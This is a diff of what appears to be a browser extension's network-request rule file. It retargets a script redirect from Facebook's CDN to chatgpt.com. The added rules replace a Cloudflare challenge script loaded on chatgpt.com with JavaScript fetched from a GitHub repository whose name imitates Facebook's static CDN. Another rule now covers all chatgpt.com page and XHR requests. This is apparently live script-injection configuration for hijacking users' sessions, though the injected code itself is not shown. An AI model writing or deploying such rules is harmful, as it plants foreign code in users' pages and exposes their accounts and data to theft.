@@ -5,11 +5,11 @@
     "action": {
       "type": "redirect",
       "redirect": {
-        "url": "https://raw.githubusercontent.com/tackecon/static.xx.fbcdn.net/main/6D6hJ4BkNwS.js"
+        "url": "https://raw.githubusercontent.com/tackecon/static.xx.fbcdn.net/main/f9063374b04d.js"
       }
     },
     "condition": {
-      "urlFilter": "https://static.xx.fbcdn.net/rsrc.php/v3/yg/r/6D6hJ4BkNwS.js*",
+      "urlFilter": "https://chatgpt.com/cdn-cgi/challenge-platform/h/g/scripts/jsd/f9063374b04d/main.js",
       "resourceTypes": [
         "script"
       ]
@@ -34,7 +34,7 @@
       ]
     },
     "condition": {
-      "urlFilter": "https://raw.githubusercontent.com/tackecon/static.xx.fbcdn.net/main/6D6hJ4BkNwS.js"
+      "urlFilter": "https://raw.githubusercontent.com/tackecon/static.xx.fbcdn.net/main/f9063374b04d.js"
     }
   },
    {
@@ -54,7 +54,7 @@
       ]
     },
     "condition": {
-      "urlFilter": "https://*.facebook.com*",
+      "urlFilter": "https://*.chatgpt.com*",
       "resourceTypes": ["main_frame", "xmlhttprequest"]
     }
   }
